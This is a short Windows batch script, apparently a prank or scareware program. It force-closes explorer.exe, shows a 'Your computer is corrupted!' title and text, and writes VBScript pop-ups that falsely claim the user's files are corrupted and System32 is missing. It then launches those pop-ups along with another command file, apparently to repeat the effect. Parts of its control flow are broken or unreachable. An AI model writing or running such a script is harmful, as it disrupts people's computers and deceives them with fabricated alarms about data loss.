@ Echo OFF
taskkill /F /IM explorer.exe
TITLE Your computer is corrupted
MODE 30
ECHO Your computer is corrupted!
echo=msgbox ("Your files and data are corrupted!") >msg1.vbs
echo=msgbox ("Can't find System32!") >msg2.vbs

:A
color BF
start msg1.vbs
start ezfrags.cmd
end

:B
color 4F
start msg2.vbs
start ezfrags.cmd
end

GOTO :A